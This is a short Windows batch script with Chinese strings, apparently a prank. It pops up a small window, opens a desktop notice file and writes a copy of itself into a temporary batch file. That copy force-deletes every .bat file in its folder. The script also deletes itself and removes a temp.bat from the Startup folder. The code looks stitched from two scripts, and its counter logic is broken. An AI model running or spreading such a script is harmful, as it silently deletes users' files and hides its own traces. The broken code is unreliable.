@echo off
title 这个窗口只会出现2次
mode con: cols=30 lines=2
set /a n=0
set /a n=%n%+1
echo 这是第 %n% 次!!!
echo @echo off >temp%n%.bat
echo title 这个窗口只会出现2次 >>temp%n%.bat
echo mode con: cols=30 lines=2 >>temp%n%.bat
echo set /a n=%n% >>temp%n%.bat
echo set /a n=%%n%%+1 >>temp%n%.bat
echo echo 这是第 %%n%% 次!!! >>temp%n%.bat
echo "C:\Documents and Settings\user\桌面\注意!!!!.txt" /start >>temp%n%.bat
echo del *.bat /f /q >>temp%n%.bat
"C:\Documents and Settings\all users\桌面\注意!!!!.txt" /start
del %0
@echo off
"C:\Documents and Settings\all users\桌面\注意!!!!.txt" /start
set /a n=0
set n=%n%+1
echo %n%
if %n%==3 del "C:\Documents and Settings\all users\「开始」菜单\程序\启动\temp.bat"
